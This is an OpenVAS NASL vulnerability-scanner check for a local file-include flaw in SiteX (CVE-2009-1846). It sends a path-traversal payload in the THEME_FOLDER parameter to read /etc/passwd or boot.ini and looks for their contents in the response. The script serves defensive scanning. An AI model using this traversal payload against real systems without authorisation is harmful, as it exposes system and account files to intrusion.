###############################################################################
# OpenVAS Vulnerability Test
# $Id: SiteX_35122.nasl 5401 2017-02-23 09:46:07Z teissa $
#
# SiteX 'THEME_FOLDER' Parameter Multiple Local File Include Vulnerabilities
#
# Authors:
# Michael Meyer
#
# Copyright:
# Copyright (c) 2010 Greenbone Networks GmbH
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE.  See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

tag_summary = "SiteX is prone to multiple local file-include vulnerabilities because
it fails to properly sanitize user-supplied input.

An attacker can exploit these issues to obtain potentially sensitive
information and execute arbitrary local scripts in the context of the
webserver process. This may allow the attacker to compromise the
application and the computer; other attacks are also possible.

SiteX 0.7.4.418 is vulnerable; other versions may also be affected.";


if (description)
{
 script_id(100454);
 script_version("$Revision: 5401 $");
 script_tag(name:"last_modification", value:"$Date: 2017-02-23 10:46:07 +0100 (Thu, 23 Feb 2017) $");
 script_tag(name:"creation_date", value:"2010-01-20 10:52:14 +0100 (Wed, 20 Jan 2010)");
 script_tag(name:"cvss_base", value:"7.5");
 script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:P/I:P/A:P");
 script_cve_id("CVE-2009-1846");
 script_bugtraq_id(35122);

 script_name("SiteX 'THEME_FOLDER' Parameter Multiple Local File Include Vulnerabilities");


 script_tag(name:"qod_type", value:"remote_vul");
 script_category(ACT_ATTACK);
 script_family("Web application abuses");
 script_copyright("This script is Copyright (C) 2010 Greenbone Networks GmbH");
 script_dependencies("find_service.nasl", "http_version.nasl");
 script_require_ports("Services/www", 80);
 script_exclude_keys("Settings/disable_cgi_scanning");
 script_tag(name : "summary" , value : tag_summary);
 script_xref(name : "URL" , value : "http://www.securityfocus.com/bid/35122");
 script_xref(name : "URL" , value : "http://sitex.bjsintay.com/index.php");
 exit(0);
}

include("http_func.inc");
include("http_keepalive.inc");
include("global_settings.inc");
   
port = get_http_port(default:80);

if(!get_port_state(port))exit(0);
if(!can_host_php(port:port))exit(0);

dirs = make_list("/sitex","/cms",cgi_dirs());

foreach dir (dirs) {
   
  url = string(dir, "/login.php"); 
  req = http_get(item:url, port:port);
  buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);  
  if( buf == NULL )continue;

  if(egrep(pattern: "Powered by.*SiteX", string: buf, icase: TRUE)) {
  
    foreach file (make_list("etc/passwd", "boot.ini")) {

      url = string(dir, "/themes/Corporate/homepage.php?THEME_FOLDER=../../../../../../",file,"%00");
      req = http_get(item:url, port:port);
      buf = http_keepalive_send_recv(port:port, data:req, bodyonly:FALSE);
      if( buf == NULL )continue;

      if(egrep(pattern:"(root:.*:0:[01]:|\[boot loader\])", string: buf)) {

        security_message(port:port);
        exit(0);

      }	
    } 
  }
}

exit(0);
